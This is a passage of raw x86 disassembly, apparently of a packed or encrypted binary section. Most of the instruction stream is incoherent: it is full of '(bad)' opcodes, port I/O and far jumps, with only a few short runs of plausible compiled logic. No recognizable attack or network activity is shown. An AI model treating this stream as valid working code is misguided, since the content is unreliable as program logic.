  4041b1:	xor    BYTE PTR [ebp+0x113a44f1],ah
  4041b7:	mov    cl,0x84
  4041b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ba:	add    BYTE PTR [eax-0x2147e08],bh
  4041c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041c1:	xor    BYTE PTR [ebp-0x6d],ah
  4041c4:	popa   
  4041c5:	and    al,0xd8
  4041c7:	jecxz  0x40416b
  4041c9:	fdivr  QWORD PTR [ebp-0x3b]
  4041cc:	mov    ebp,0x31812044
  4041d1:	sub    BYTE PTR [ebp-0x1ad40106],ah
  4041d7:	inc    esi
  4041d8:	in     eax,dx
  4041d9:	inc    ebp
  4041da:	push   0xffffff83
  4041dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041dd:	js     0x404247
  4041df:	mov    ebx,esi
  4041e1:	in     al,0x8
  4041e3:	adc    eax,0x93e3e738
  4041e8:	and    al,0x7a
  4041ea:	or     eax,0x5e283196
  4041ef:	clc    
  4041f0:	adc    BYTE PTR [eax],0xc2
  4041f3:	or     eax,0x4ce1c695
  4041f8:	loopne 0x40418a
  4041fa:	dec    ecx
  4041fb:	inc    esp
  4041fc:	add    eax,0x6f171cc8
  404201:	rep stos DWORD PTR es:[edi],eax
  404203:	sbb    eax,0x99c0b688
  404208:	push   ebx
  404209:	dec    eax
  40420a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40420b:	jns    0x404198
  40420d:	push   es
  40420e:	push   esp
  40420f:	int    0xfd
  404211:	add    al,0xd8
  404213:	ja     0x404285
  404215:	cmp    BYTE PTR [edi+0x3],dh
  404218:	retf   0x4086
  40421b:	repnz out dx,al
  40421d:	mov    ecx,0xc732e622
  404222:	in     eax,0x22
  404224:	mov    esi,0x810466db
  404229:	std    
  40422a:	mov    ds:0x70104cca,al
  40422f:	add    ch,al
  404231:	and    eax,0x8c077ae7
  404236:	xor    DWORD PTR [edx],0xffffffae
  404239:	call   0x30602108
  40423e:	or     esi,DWORD PTR [ebp+edx*2-0x75]
  404242:	sub    DWORD PTR [eax+0x65],eax
  404245:	cwde   
  404246:	jle    0x404267
  404248:	in     eax,dx
  404249:	retf   
  40424a:	mov    dh,0x3f
  40424c:	test   eax,0xf334564e
  404251:	ficomp WORD PTR [eiz*8-0x4baf4dbd]
  404258:	test   DWORD PTR [ebx+ecx*8-0x40],eax
  40425c:	sti    
  40425d:	cdq    
  40425e:	psubusw mm6,QWORD PTR [ebp+ecx*1+0x39]
  404263:	sar    ah,1
  404265:	je     0x404258
  404267:	mov    al,0x46
  404269:	xchg   ebx,eax
  40426a:	and    eax,0xd3f5eb22
  40426f:	mov    ds:0x8752c89,al
  404274:	fwait
  404275:	mov    eax,0xc7e4bac0
  40427a:	clc    
  40427b:	mov    edi,esi
  40427d:	mov    eax,0x6d8e90c2
  404282:	pop    esi
  404283:	lods   al,BYTE PTR ds:[esi]
  404284:	mov    ch,0x5f
  404286:	mov    ds:0x4c9df3a6,eax
  40428b:	test   al,0x5a
  40428d:	dec    ecx
  40428e:	lods   eax,DWORD PTR ds:[esi]
  40428f:	mov    esp,0x4598f5e6
  404294:	jno    0x4042a5
  404296:	scas   al,BYTE PTR es:[edi]
  404297:	or     ecx,esi
  404299:	jmp    0x64d4:0xbfae4fef
  4042a0:	cmc    
  4042a1:	icebp  
  4042a2:	int    0x71
  4042a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042a5:	mov    al,0x9
  4042a7:	pop    ss
  4042a8:	popa   
  4042a9:	iret   
  4042aa:	push   ebp
  4042ab:	in     eax,0x86
  4042ad:	dec    ebx
  4042ae:	mov    eax,ds:0x54b570cc
  4042b3:	push   esp
  4042b4:	rcl    DWORD PTR [edi-0x3],cl
  4042b7:	push   edx
  4042b8:	inc    ebp
  4042b9:	inc    edi
  4042ba:	cmp    al,0xaf
  4042bc:	cmp    edi,DWORD PTR [ebp-0x3a]
  4042bf:	enter  0x5f44,0x77
  4042c3:	and    DWORD PTR [esi-0x41bd8033],ebx
  4042c9:	aad    0x58
  4042cb:	shl    ch,cl
  4042cd:	mul    DWORD PTR [esi+ebp*4-0x76]
  4042d1:	in     al,0xd1
  4042d3:	popf   
  4042d4:	(bad)  [ebp+0x663300d8]
  4042da:	shl    eax,1
  4042dc:	xor    al,BYTE PTR ds:0x13496a6b
  4042e2:	push   0x2cea68a7
  4042e7:	and    esp,DWORD PTR [ebp+0x47]
  4042ea:	sbb    ebx,DWORD PTR es:[ecx+0x69fae96c]
  4042f1:	mov    al,0xfa
  4042f3:	jge    0x404346
  4042f5:	mov    esp,0x19c4d0a9
  4042fa:	retf   
  4042fb:	sbb    BYTE PTR [ebx],cl
  4042fd:	stos   BYTE PTR es:[edi],al
  4042fe:	mov    ch,0xb5
  404300:	jb     0x404366
  404302:	test   ebp,edx
  404304:	dec    ecx
  404305:	fdivr  DWORD PTR [edx+0x67]
  404308:	aad    0x15
  40430a:	les    ebp,FWORD PTR [edx-0x3a]
  40430d:	dec    ebx
  40430e:	stos   BYTE PTR es:[edi],al
  40430f:	or     eax,0xe94db8da
  404314:	addr16 push ds
  404316:	sbb    BYTE PTR [ecx-0xa],dh
  404319:	ret    
  40431a:	rcl    ebp,1
  40431c:	lods   eax,DWORD PTR ds:[esi]
  40431d:	retw   0x1a2b
  404321:	(bad)  
  404322:	retf   
  404323:	test   bl,dh
  404325:	(bad)  
  404326:	std    
  404327:	cwde   
  404328:	test   DWORD PTR [edx+0x59],eax
  40432b:	enter  0xf21c,0xd6
  40432f:	mov    ebp,DWORD PTR [ecx-0x30]
  404332:	aaa    
  404333:	adc    al,0x61
  404335:	sub    al,0x7
  404337:	aam    0x40
  404339:	jmp    0x4042c0
  40433b:	aas    
  40433c:	sbb    al,0x5f
  40433e:	outs   dx,DWORD PTR ds:[esi]
  40433f:	or     eax,0xb19bed44
  404344:	push   esi
  404345:	push   ecx
  404346:	inc    eax
  404347:	inc    ecx
  404348:	and    al,0x6e
  40434a:	xchg   esp,eax
  40434b:	addr16 or ah,dh
  40434e:	cmp    BYTE PTR [ecx],al
  404350:	(bad)  
  404351:	sub    al,0x89
  404353:	inc    esp
  404354:	fdivp  st(2),st
  404356:	sbb    ebp,DWORD PTR [edi]
  404358:	mov    bl,0xfc
  40435a:	jecxz  0x404324
  40435c:	add    al,0x5b
  40435e:	sbb    ah,BYTE PTR [edx-0x15]
  404361:	fisubr WORD PTR [ecx+ecx*4]
  404364:	out    dx,eax
  404365:	mov    ah,0xbb
  404367:	or     al,0xa
  404369:	mov    cl,0x97
  40436b:	xchg   cl,dl
  40436d:	ss push ss
  40436f:	pop    esi
  404370:	mov    eax,ds:0xfdec45f1
  404375:	pushf  
  404376:	push   ds
  404377:	imul   esp,DWORD PTR [esi],0xcc0c9be7
  40437d:	push   esi
  40437e:	push   es
  40437f:	addr16 addr16 iret 
  404382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404383:	jbe    0x404349
  404385:	dec    edi
  404386:	jae    0x40439a
  404388:	cmp    ebp,0xb8bd4a75
  40438e:	or     ecx,DWORD PTR [ebp+edi*2-0x15]
  404392:	push   0xffffffab
  404394:	and    BYTE PTR [ecx-0x4afb5c5e],al
  40439a:	xchg   esi,eax
  40439c:	cmp    al,0x53
  40439e:	pop    edi
  40439f:	neg    ch
  4043a1:	lahf   
  4043a2:	icebp  
  4043a3:	adc    edi,DWORD PTR [eax-0x7d]
  4043a6:	mov    al,ds:0x4324160
  4043ab:	mov    WORD PTR [eax-0x1af6647d],?
  4043b1:	or     DWORD PTR [esi+ebp*8+0x63],edx
  4043b5:	push   edi
  4043b6:	sub    BYTE PTR [ebp+0x7795e5a5],ch
  4043bc:	out    0x9f,al
  4043be:	lock or al,0x39
  4043c1:	or     dl,bl
  4043c3:	dec    esp
  4043c4:	xchg   edx,eax
  4043c5:	mov    ecx,edi
  4043c7:	hlt    
  4043c8:	push   esp
  4043c9:	xor    DWORD PTR [esi-0x4accece],edx
  4043cf:	fild   QWORD PTR [edi-0xd]
  4043d2:	jg     0x4043f5
  4043d4:	or     DWORD PTR [ebx],ebx
  4043d6:	in     al,0x5b
  4043d8:	fldenv ss:[eax]
  4043db:	mov    edx,0xa5356767
  4043e0:	test   BYTE PTR [ebp-0x1a0c83e1],bl
  4043e6:	gs repz out 0xdd,eax
  4043ea:	jmp    0x11271c74
  4043ef:	xor    DWORD PTR [esi],esp
  4043f1:	aam    0x64
  4043f3:	add    BYTE PTR [edi],ch
  4043f5:	inc    esp
  4043f6:	push   edi
  4043f7:	ins    BYTE PTR es:[edi],dx
  4043f8:	push   ecx
  4043f9:	sub    eax,0x449eab59
  4043fe:	xchg   edx,eax
  4043ff:	inc    esp
  404400:	sahf   
  404401:	ss jmp 0x4043f4
  404404:	mov    al,0xd0
  404406:	clc    
  404407:	es ds dec esi
  40440a:	cmc    
  40440b:	add    esi,DWORD PTR [edx-0x5c]
  40440e:	push   0xffffffe3
  404410:	xchg   esp,eax
  404411:	out    0x71,al
  404413:	sbb    al,0xee
  404415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404416:	push   ss
  404417:	stc    
  404418:	jno    0x404484
  40441a:	sahf   
  40441b:	out    0x54,al
  40441d:	or     DWORD PTR [ebx+0x493df6f2],ebp
  404423:	ror    BYTE PTR [ebx+ebx*8+0x69527fb1],cl
  40442a:	pop    esp
  40442b:	(bad)  
  40442c:	lods   al,BYTE PTR ds:[esi]
  40442d:	xor    al,0xdd
  40442f:	gs mov bl,0xd3
  404432:	test   al,0xe1
  404434:	test   eax,0x60f98a36
  404439:	pop    ecx
  40443a:	mov    esp,0xc57345b5
  40443f:	push   esp
  404440:	clc    
  404441:	sub    al,0x1c
  404443:	sub    BYTE PTR [edx+0x6],bh
  404446:	sbb    al,0xf
  404448:	(bad)  
  404449:	push   esp
  40444a:	dec    ecx
  40444b:	scas   al,BYTE PTR es:[edi]
  40444c:	lods   eax,DWORD PTR ds:[esi]
  40444d:	pop    ebx
  40444e:	inc    ebp
  40444f:	jp     0x4043e1
  404451:	dec    edx
  404452:	call   0x1fbbb69d
  404457:	xchg   edx,eax
  404458:	dec    edi
  404459:	lods   eax,DWORD PTR ds:[esi]
  40445a:	cdq    
  40445b:	cwde   
  40445c:	push   eax
  40445d:	addr16 call 0xf99784a5
  404463:	call   0x8af3a447
  404468:	je     0x4044ac
  40446a:	in     al,dx
  40446b:	mov    dh,0x9f
  40446d:	fisttp WORD PTR [edx-0x3a]
  404470:	dec    esp
  404471:	dec    eax
  404472:	enter  0xd32,0x57
  404476:	adc    eax,0x6089927a
  40447b:	inc    ebx
  40447c:	stc    
  40447d:	or     dh,ah
  40447f:	loope  0x4044ec
  404481:	add    bh,BYTE PTR [ebx]
  404483:	js     0x404439
  404485:	xchg   esp,eax
  404486:	rcl    DWORD PTR [edx],cl
  404488:	mov    eax,0xd4b9d947
  40448d:	fcomp  QWORD PTR [ecx]
  40448f:	mov    ds:0xd0241c97,eax
  404494:	call   0xa9c90622
  404499:	dec    esi
  40449a:	pop    ebp
  40449b:	sbb    ecx,DWORD PTR [esi]
  40449d:	mov    ebx,0x6d2189a4
  4044a2:	xor    al,0x8
  4044a4:	xchg   ebx,eax
  4044a5:	or     BYTE PTR [ebx+0x68f4d9d5],dh
  4044ab:	jecxz  0x4044a0
  4044ad:	add    DWORD PTR [ebx-0x13],ebp
  4044b0:	or     BYTE PTR [esi-0x33634ee8],0xd0
  4044b7:	cmp    ah,bl
  4044b9:	lahf   
  4044ba:	in     eax,0x2f
  4044bc:	and    ch,BYTE PTR [eax-0x27902e6f]
  4044c2:	ror    DWORD PTR [edx-0x5c],cl
  4044c5:	call   0x3fd9:0xcff47487
  4044cc:	rol    DWORD PTR [ecx+0x57],1
  4044cf:	jbe    0x40445b
  4044d1:	inc    esp
  4044d2:	add    eax,0xff558aa8
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	inc    esi
  40450c:	cwd    
  40450e:	(bad)  
  40450f:	jmp    0x404538
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x404565
  404518:	ins    BYTE PTR es:[edi],dx
  404519:	icebp  
  40451a:	and    al,0x3e
  40451c:	dec    esp
  40451d:	mov    al,0xd4
  40451f:	gs mov al,0x6e
  404522:	jbe    0x404555
  404524:	jo     0x40452e
  404526:	rol    ebx,0x17
  404529:	jge    0x404595
  40452b:	shr    DWORD PTR [edx+0x4dbaf232],cl
  404531:	lods   eax,DWORD PTR ds:[esi]
  404532:	inc    eax
  404533:	pop    edi
  404534:	lds    esi,FWORD PTR [edi]
  404536:	imul   edi,DWORD PTR [edx+0x24],0xe4c81a8c
  40453d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453e:	push   ss
  40453f:	push   cs
  404540:	push   edx
  404541:	jl     0x40455a
  404543:	in     eax,0xa
  404545:	sahf   
  404546:	es jo  0x4044cd
  404549:	loop   0x404562
  40454b:	xchg   DWORD PTR [ebp+0x3a1180b6],esi
  404551:	xor    DWORD PTR [ebp-0x307a7266],edi
  404557:	ins    DWORD PTR es:[edi],dx
  404558:	push   es
  404559:	scas   eax,DWORD PTR es:[edi]
  40455a:	enter  0x601a,0xc3
  40455e:	enter  0xe6a,0xc4
  404562:	mov    dl,0xec
  404564:	or     edx,DWORD PTR [edx+0x0]
  404567:	sbb    eax,0xf951e785
  40456c:	mov    bh,0x2b
  40456e:	clc    
  40456f:	mov    WORD PTR [ebx+0x3],es
  404572:	add    dh,BYTE PTR ss:[ebp+0x14]
  404576:	mov    ebp,0x183538e7
  40457b:	out    0xab,eax
  40457d:	nop
  40457e:	into   
  40457f:	or     eax,0x2eb877a7
  404584:	les    esi,FWORD PTR [ebx+0x56]
  404587:	cmp    al,0x4a
  404589:	mov    ah,0xfe
  40458b:	cdq    
  40458c:	outs   dx,BYTE PTR ds:[esi]
  40458d:	rol    BYTE PTR ds:0x65f799d,1
  404593:	jne    0x404547
  404595:	enter  0x379e,0xff
  404599:	mov    ah,0xad
  40459b:	scas   eax,DWORD PTR es:[edi]
  40459c:	mov    edi,0xd6f65046
  4045a1:	sbb    eax,0x79669e82
  4045a6:	lds    ecx,FWORD PTR [esi]
  4045a8:	mov    ebp,0xe54315b2
  4045ad:	mov    al,ds:0xe9845ce
  4045b2:	(bad)  
  4045b3:	ret    0x13ee
  4045b6:	xor    eax,0x2e1a4bae
  4045bb:	push   cs
  4045bc:	mov    esi,0x7f59b759
  4045c1:	test   al,bl
  4045c3:	mov    esi,0x497a9787
  4045c8:	popf   
  4045c9:	rep movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4045cc:	mov    esp,0x1438a7f9
  4045d1:	mov    bh,0x8c
  4045d3:	aad    0x6d
  4045d5:	jo     0x404569
  4045d7:	rcl    ebp,1
  4045d9:	cmp    DWORD PTR [edi],edi
  4045db:	or     eax,0x1c485ee6
  4045e0:	mov    ch,0x68
  4045e2:	dec    ebx
  4045e3:	dec    edx
  4045e4:	nop
  4045e5:	cs in  al,0xb5
  4045e8:	ret    
  4045e9:	or     al,0x9f
  4045eb:	std    
  4045ec:	in     eax,0x5d
  4045ee:	and    DWORD PTR [esi-0x484dc0db],edi
  4045f4:	xchg   edi,eax
  4045f5:	ror    DWORD PTR [esi-0x3d],cl
  4045f8:	xchg   esi,eax
  4045f9:	mov    al,ds:0x26f48ea7
  4045fe:	fadd   DWORD PTR [edi+0x5d]
  404601:	cmc    
  404602:	sub    eax,0xb07e6d36
  404607:	rcr    DWORD PTR [edx+ecx*1-0x41e44bdf],0xe8
  40460f:	mov    edx,DWORD PTR [eax]
  404611:	aad    0x46
  404613:	inc    esi
  404614:	mov    ds:0x1cfd5d16,al
  404619:	mov    bl,ah
  40461b:	or     BYTE PTR [esi],0xbd
  40461e:	clc    
  40461f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404620:	cmp    al,0x2c
  404622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404623:	xchg   ebx,eax
  404624:	and    eax,0x5ef0d3f1
  404629:	sti    
  40462a:	lock (bad) 
  40462c:	sbb    BYTE PTR [eax+eax*2+0x1da94f23],ch
  404633:	xchg   ebp,eax
  404634:	push   esi
  404635:	mov    bh,0x11
  404637:	or     DWORD PTR [eax+0x34],ecx
  40463a:	and    BYTE PTR [ebx-0x4f],dl
  40463d:	outs   dx,DWORD PTR ds:[esi]
  40463e:	icebp  
  40463f:	(bad)  
  404641:	ds pop es
  404643:	inc    ecx
  404644:	and    al,0x92
  404646:	inc    edi
  404647:	pop    ecx
  404648:	pop    esp
  404649:	adc    DWORD PTR [edi+0x6],esi
  40464c:	pop    esi
  40464d:	lea    esp,[esi+0x1f57a53b]
  404653:	lahf   
  404654:	and    edx,DWORD PTR ds:0xcc96c19b
  40465a:	jg     0x40463e
  40465c:	mov    bl,0x70
  40465e:	mov    bh,0xa5
  404660:	hlt    
  404661:	or     BYTE PTR [eax+ecx*1],bh
  404664:	xor    al,0xa5
  404666:	cli    
  404667:	ds jnp 0x40462c
  40466a:	xor    ch,BYTE PTR [ecx-0x2a]
  40466d:	add    DWORD PTR [esi],ebp
  40466f:	adc    BYTE PTR [ebx],dl
  404671:	inc    eax
  404672:	jmp    0xcf12:0xe9ea1d5d
  404679:	in     eax,0x9c
  40467b:	adc    BYTE PTR [esi-0x80],dl
  40467e:	retw   0xb646
  404682:	inc    esp
  404683:	push   cs
  404684:	repnz enter 0xa7a1,0xff
  404689:	rcl    BYTE PTR ds:0x7608ce92,1
  40468f:	repnz or eax,0x82f01b83
  404695:	xchg   ebp,eax
  404696:	enter  0x6c35,0xd0
  40469a:	push   esp
  40469b:	or     DWORD PTR [eax+0x23],0xffffffa7
  40469f:	push   es
  4046a0:	gs test eax,0xb3369ee8
  4046a6:	push   ds
  4046a7:	sub    eax,0x4a40ffe8
  4046ac:	out    0xad,al
  4046ae:	push   cs
  4046af:	arpl   WORD PTR [esi-0x51654f62],cx
  4046b5:	inc    ebx
  4046b6:	(bad)  
  4046b7:	sti    
  4046b8:	stos   BYTE PTR es:[edi],al
  4046b9:	mov    dl,0x0
  4046bb:	stos   DWORD PTR es:[edi],eax
  4046bc:	gs pop esp
  4046be:	fsubr  QWORD PTR [eax+eax*8-0x90c3300]
  4046c5:	repz pop esp
  4046c7:	or     ch,BYTE PTR [eax]
  4046c9:	loopne 0x4046ea
  4046cb:	hlt    
  4046cc:	call   0x8148e596
  4046d1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4046d3:	(bad)  
  4046d4:	fldenv [ecx-0x45a8b689]
  4046da:	imul   ebp,DWORD PTR [ecx+0x4ab3177f],0x89acf38c
  4046e4:	xchg   edi,edx
  4046e6:	bound  edi,QWORD PTR [esi]
  4046e8:	lds    ecx,FWORD PTR [eax-0x61]
  4046eb:	call   0x3c98:0xac94b260
  4046f2:	mov    ch,BYTE PTR [edx-0x378c8148]
  4046f8:	test   eax,0xd94e53d3
  4046fd:	(bad)  
  4046fe:	jmp    0x56e0:0x13f32038
  404705:	xor    eax,0x806fb1f0
  40470a:	out    0xfc,eax
  40470c:	mov    ?,WORD PTR [edx+eax*2]
  40470f:	lahf   
  404710:	pop    esp
  404711:	sbb    ecx,DWORD PTR [ecx+0x5a77b00f]
  404717:	mov    dh,0xde
  404719:	and    eax,0x6ebe8317
  40471e:	or     esi,DWORD PTR [eax-0x3a]
  404721:	mov    eax,edx
  404723:	xchg   edx,eax
  404724:	loope  0x4046d8
  404726:	mov    bl,0x33
  404728:	mov    ds:0x6ce6b458,al
  40472d:	nop
  40472e:	rcr    ch,cl
  404730:	cmp    BYTE PTR [esi+0x4c],al
  404733:	sahf   
  404734:	std    
  404735:	in     eax,dx
  404736:	jne    0x40475a
  404738:	mov    edi,0x2e1b9c40
  40473d:	inc    ebx
  40473e:	dec    edi
  40473f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404740:	or     esp,DWORD PTR [eax+eiz*8]
  404743:	(bad)  [esi+0x18f3f946]
  404749:	inc    edi
  40474a:	jns    0x4047a4
  40474c:	pop    eax
  40474d:	addr16 jnp 0x4047c9
  404750:	pop    ss
  404751:	rcl    ebp,0xeb
  404754:	enter  0x63f3,0xa5
  404758:	imul   ebx,DWORD PTR [eax-0x40a3e6ed],0xffffffcf
  40475f:	push   ss
  404760:	mov    eax,0x89b7369b
  404765:	(bad)  
  404766:	fidiv  WORD PTR [eax]
  404768:	mov    esi,0xf7cfa8d4
  40476d:	lahf   
  40476e:	mul    BYTE PTR [ecx]
  404770:	pushf  
  404771:	shr    ecx,0x47
  404774:	cdq    
  404775:	popf   
  404776:	push   ecx
  404777:	sbb    DWORD PTR [edi],edx
  404779:	loopne 0x404780
  40477b:	out    dx,eax
  40477c:	xchg   ecx,eax
  40477d:	adc    eax,0x69b89fee
  404782:	cmp    al,0xda
  404784:	aam    0x31
  404786:	sub    edx,DWORD PTR [ecx]
  404788:	mov    ch,0x2d
  40478a:	mov    cl,0xf0
  40478c:	jmp    0x40477b
  40478e:	sub    dh,0xf0
  404791:	adc    DWORD PTR ds:0xe83ea933,0xfffffff3
  404798:	cmc    
  404799:	cs adc cl,ch
  40479c:	sbb    edi,DWORD PTR [edx+0x2b48d1dc]
  4047a2:	cdq    
  4047a3:	fs aas 
  4047a5:	imul   DWORD PTR ds:0x4611eb09
  4047ab:	out    0xae,al
  4047ad:	les    esi,FWORD PTR [edi]
  4047af:	daa    
  4047b0:	inc    ecx
  4047b1:	mov    DWORD PTR [esi+0xa],edi
  4047b4:	int3   
  4047b5:	pop    es
  4047b6:	sub    al,0x71
  4047b8:	cmp    dl,al
  4047ba:	or     al,0xc5
  4047bc:	repnz in al,0x83
  4047bf:	inc    ebp
  4047c0:	mov    ds:0xa444ed3f,eax
  4047c5:	and    DWORD PTR [eax],0x7a
  4047c8:	dec    eax
  4047c9:	mov    ah,0xf9
  4047cb:	adc    al,bl
  4047cd:	test   BYTE PTR [edi],bl
  4047cf:	jmp    0x8454f7b5
  4047d4:	int    0x94
  4047d6:	retf   
  4047d7:	jno    0x4047a1
  4047d9:	mov    ch,0xf5
  4047db:	test   al,0xd
  4047dd:	xor    eax,0xc431499d
  4047e2:	push   ss
  4047e3:	pop    edx
  4047e4:	repz cld 
  4047e6:	dec    ebx
  4047e7:	rcl    BYTE PTR [eax-0x39005046],1
  4047ed:	adc    al,0x7b
  4047ef:	or     BYTE PTR [edi],0xb2
  4047f2:	sbb    eax,0xc54e3296
  4047f7:	daa    
  4047f8:	add    dl,BYTE PTR [ebx+0x1792f0db]
  4047fe:	xchg   ebp,eax
  4047ff:	nop
  404800:	push   ecx
  404801:	out    0x7b,al
  404803:	pop    esi
  404804:	stos   DWORD PTR es:[edi],eax
  404805:	cmc    
  404806:	retf   
  404807:	inc    esp
  404808:	test   eax,0x2bfa42a8
  40480d:	ffreep st(7)
  40480f:	dec    edx
  404810:	or     eax,0x718f1734
  404815:	ret    0xdf0b
  404818:	bound  ecx,QWORD PTR [esi]
  40481a:	dec    esi
  40481b:	ss pop esp
  40481d:	mov    dl,0x6a
  40481f:	inc    esi
  404820:	sbb    ebx,esi
  404822:	fwait
  404823:	pop    ds
  404824:	fwait
  404825:	inc    ebx
  404826:	or     al,ah
  404828:	test   eax,0xc2d157e4
  40482d:	mov    esp,esp
  40482f:	repz test dl,0xfb
  404833:	dec    edx
  404834:	adc    ebx,DWORD PTR [edx+0x14]
  404837:	xchg   esp,eax
  404838:	(bad)  [esi]
  40483a:	or     eax,0xe250d552
  40483f:	mov    dl,0x24
  404841:	jns    0x40480d
  404843:	dec    ecx
  404844:	in     eax,0x6
  404846:	mov    cl,0x45
  404848:	sti    
  404849:	xchg   ebx,eax
  40484a:	imul   ecx,DWORD PTR [ecx-0x5b],0xb750bd73
  404851:	data16 aaa 
  404853:	mov    al,ds:0x2e6b05e6
  404858:	jns    0x404892
  40485a:	or     ch,al
  40485c:	mov    ebp,0xd3431e51
  404861:	ja     0x40485d
  404863:	push   ds
  404864:	mov    eax,0x32310fb
  404869:	pop    esi
  40486a:	jns    0x4048e4
  40486c:	or     al,0xad
  40486e:	es cld 
  404870:	fisttp QWORD PTR [eax]
  404872:	imul   ebx,DWORD PTR [edi],0xdfbfe397
  404878:	add    esi,DWORD PTR [esi-0x3ad6c3fa]
  40487e:	sub    al,0xa4
  404880:	push   esp
  404881:	ins    BYTE PTR es:[edi],dx
  404882:	test   al,0x67
  404884:	xor    BYTE PTR [edi+0x46],0xc
  404888:	dec    ebx
  404889:	fdivr  QWORD PTR [ebp-0x67]
  40488c:	xchg   esp,eax
  40488d:	pop    esi
  40488e:	jnp    0x4048f1
  404890:	out    dx,eax
  404891:	jg     0x404842
  404893:	(bad)  
  404894:	mov    dl,0xf2
  404896:	sub    esi,DWORD PTR [edi-0x7c]
  404899:	pop    edi
  40489a:	xlat   BYTE PTR ds:[ebx]
  40489b:	mov    bh,0x18
  40489d:	dec    esi
  40489e:	test   DWORD PTR es:[eax],0x3a3ee844
  4048a5:	mov    ds:0xca5ce91e,al
  4048aa:	je     0x4048e8
  4048ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048ad:	aaa    
  4048ae:	or     ch,BYTE PTR [ebp+0x3fb00c01]
  4048b4:	enter  0x72f5,0xb6
  4048b8:	sahf   
  4048b9:	test   BYTE PTR [ebx-0x49e37186],0xac
  4048c0:	fadd   st(3),st
  4048c2:	bswap  ecx
  4048c4:	scas   eax,DWORD PTR es:[edi]
  4048c5:	lock into 
  4048c7:	fmul   QWORD PTR [esi+0x4f115284]
  4048cd:	imul   esi,DWORD PTR [edi+0x24b4f7ec],0x2b
  4048d4:	push   ss
  4048d5:	pop    edi
  4048d6:	inc    ebp
  4048d8:	outs   dx,BYTE PTR ds:[esi]
  4048d9:	push   ebp
  4048da:	adc    edx,ecx
  4048dc:	or     ebp,eax
  4048de:	out    0xb0,eax
  4048e0:	or     BYTE PTR [edx+ebp*1-0x4bab1831],al
  4048e7:	sbb    BYTE PTR [esi],ch
  4048e9:	or     DWORD PTR [edi-0x63241f24],0xc603c133
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	pop    edi
  40491a:	jge    0x40492b
  40491c:	add    bl,0x23
  40491f:	jle    0x40499f
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x404941
  404926:	and    al,0x45
  404928:	dec    edx
  404929:	dec    eax
  40492a:	adc    ebx,ebp
  40492c:	jne    0x404914
  40492e:	xchg   esp,eax
  40492f:	sysexit 
  404931:	lock or dl,BYTE PTR ds:0x598ca2e4
  404938:	mov    edx,ebp
  40493a:	xchg   DWORD PTR [edx],edx
  40493c:	xlat   BYTE PTR ds:[ebx]
  40493d:	and    BYTE PTR [ebx],cl
  40493f:	sbb    ebp,DWORD PTR [esi+ecx*4+0x5766d69b]
  404946:	dec    edx
  404947:	dec    edi
  404948:	and    al,0x5f
  40494a:	mov    esi,0x9347f5cc
  40494f:	add    bh,BYTE PTR [eax-0x5e]
  404952:	mov    gs,WORD PTR [ecx+eax*8+0x7dbb71c8]
  404959:	enter  0xf1b,0xa8
  40495d:	(bad)  
  40495e:	call   DWORD PTR [eax+0x9f39f7e]
  404964:	call   0x5853aeee
  404969:	idiv   DWORD PTR [edx+0x3496fc4e]
  40496f:	xor    BYTE PTR [edi],ah
  404971:	repz fmul DWORD PTR [ebp+0x11]
  404975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404976:	call   0x6bb7:0xc1152dcb
  40497d:	cmp    DWORD PTR [edi+0x1771982a],edx
  404983:	sbb    BYTE PTR [edx-0xd3c02c7],bh
  404989:	out    dx,al
  40498a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40498b:	or     DWORD PTR [ecx+0x44],edx
  40498e:	xor    ecx,DWORD PTR [ebx-0x45]
  404991:	pop    ebp
  404992:	rcl    DWORD PTR [ecx+0x5be99a90],1
  404998:	push   0x1f
  40499a:	popf   
  40499b:	(bad)  
  40499c:	xor    BYTE PTR [esi+0x60],ch
  40499f:	jae    0x40492f
  4049a1:	ja     0x404a04
  4049a3:	imul   esp,DWORD PTR [edx+0x24],0xffffffea
  4049a7:	jae    0x404936
  4049a9:	fld    TBYTE PTR [ebp+0x2632a662]
  4049af:	shl    DWORD PTR [eax-0x42],0x5f
  4049b3:	lea    ebx,[ebp-0x6a]
  4049b6:	inc    ebp
  4049b7:	ja     0x4049dc
  4049b9:	or     BYTE PTR [esi],bh
  4049bb:	repz jle 0x40496e
  4049be:	mov    ebp,0x1a9ea79a
  4049c3:	imul   esp,DWORD PTR [ecx+esi*8],0x9eaa9aed
  4049ca:	(bad)  
